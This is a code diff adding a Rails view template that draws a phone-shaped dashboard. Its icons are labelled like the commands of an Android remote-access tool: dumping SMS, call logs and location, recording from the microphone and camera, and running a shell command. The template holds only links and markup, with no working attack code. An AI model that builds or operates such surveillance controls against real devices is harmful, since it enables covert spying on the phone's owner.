@@ -1,0 +1,81 @@
+<%= stylesheet_link_tag 'smartphones2', media: 'all', 'data-turbolinks-track': 'reload' %>
+<%= stylesheet_link_tag 'smartphones', media: 'all', 'data-turbolinks-track': 'reload' %>
+<%= javascript_pack_tag 'smartphones', 'data-turbolinks-track': 'reload' %>
+
+<div class="smartphonee">
+    <div class="volume-btnn"></div>
+    <div class="app-wrapperr">
+        <div class="topp-0">
+            <div class="cameraa"></div><div class="speakerr"></div><div class="cameraa hidee"></div>
+        </div>
+        <div class="topp">
+        </div>
+        <div class="screenn">
+            <div class="top-icons">
+                <div class="app_row">
+                    <%= link_to image_tag("whatsapp_data.png", :alt => "WhatsApp Data", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                    <%= link_to image_tag("sound_level.png", :alt => "Sound Level", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                    <%= link_to image_tag("wifi_info.png", :alt => "Wi-Fi Information", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                    <%= link_to image_tag("dump_call_logs.png", :alt => "Call Logs", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                </div>
+                <div class="app_names">
+                    <span class="app_name">WhatsApp Data</span>
+                    <span class="app_name">Sound Level</span>
+                    <span class="app_name">Wi-Fi Information</span>
+                    <span class="app_name">Dump Call Log</span>
+                </div>
+                <div class="app_row">
+                    <%= link_to image_tag("system_info.png", :alt => "System Info", :class => "smartphone-icon"), '../smartphones/install', method: :post %>
+                    <%= link_to image_tag("dump_location.png", :alt => "Dump Location", :class => "smartphone-icon"), '../smartphones/install', method: :post %>
+                    <%= link_to image_tag("video_rec.png", :alt => "Video REC", :class => "smartphone-icon"), '../smartphones/install', method: :post %>
+                    <%= link_to image_tag("dump_messages.png", :alt => "Dump SMS", :class => "smartphone-icon"), '../smartphones/install', method: :post %>
+                </div>
+                <div class="app_names">
+                    <span class="app_name">System Info</span>
+                    <span class="app_name">Dump Location</span>
+                    <span class="app_name">Camera REC</span>
+                    <span class="app_name">Dump Messages</span>
+                </div>
+                <div class="app_row">
+                    <%= link_to image_tag("dump_localtime.png", :alt => "Dump Localtime", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                    <%= link_to image_tag("microphone_rec.png", :alt => "Microphone REC", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                    <%= link_to image_tag("uninstall_app.png", :alt => "Uninstall App", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                    <%= link_to image_tag("list_installed_apps.png", :alt => "Installed Apps", :class => "smartphone-icon"), '../pictures/take_picture?smartphone_id=' + smartphone.id.to_s,
+                        method: :post, :remote => true %>
+                </div>
+                <div class="app_names">
+                    <span class="app_name">Dump Localtime</span>
+                    <span class="app_name">Microphone REC</span>
+                    <span class="app_name">Uninstall App</span>
+                    <span class="app_name">Installed Apps</span>
+                </div>
+                <div class="app_row">
+                    <%= link_to image_tag("lock_screen.png", :alt => "Lock Screen", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                    <%= link_to image_tag("wlan_geolocate.png", :alt => "WLAN Geolocate", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                    <%= link_to image_tag("shell_command.png", :alt => "Shell Command", :class => "smartphone-icon"), '../smartphones/install', method: :post%>
+                    <%= link_to image_tag("webcam_snap.png", :alt => "Webcam Snap", :class => "smartphone-icon"), '../pictures/take_picture?smartphone_id=' + smartphone.id.to_s,
+                        method: :post, :remote => true , :id => "webcam_snap_link" %>
+                </div>
+                <div class="app_names">
+                    <span class="app_name">Lock Screen</span>
+                    <span class="app_name">WLAN Geolocate</span>
+                    <span class="app_name">Shell Command</span>
+                    <span class="app_name">Webcam Snap</span>
+                </div>
+
+    </div>
+    
+          <div class="timee">
+            <div id="ctt"></div>
+            <div id="cdd"></div>
+          </div>
+
+        </div>
+        <div class="bottomm">
+            <div class="touch-buttonn"></div>
+        </div>
+    </div>
+  </div>
+
+
+
